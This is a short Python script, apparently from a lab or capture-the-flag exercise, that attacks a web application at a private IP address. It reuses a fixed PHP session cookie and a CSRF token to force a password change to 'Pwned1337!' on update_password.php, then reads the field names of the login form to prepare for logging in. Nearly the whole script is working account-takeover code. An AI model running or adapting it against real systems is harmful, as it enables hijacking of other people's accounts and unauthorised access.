import requests, re

s = requests.Session()
s.cookies.set('PHPSESSID', 'k6qh5jtubf314jfo61sh1qk0d2')

tok = 'ad148a3ca8bd0ef3b48c52454c493ec5'
rp = s.post('http://10.82.129.17/update_password.php',
            data={'new_password': 'Pwned1337!', 'csrf_token': tok})
print('update_password:', rp.status_code, rp.text[:300])

# Also check login form field names
rl = requests.get('http://10.82.129.17/login.php')
print('\nLogin form fields:')
for m in re.finditer(r'<input[^>]+name="([^"]+)"', rl.text):
    print(' ', m.group(1))
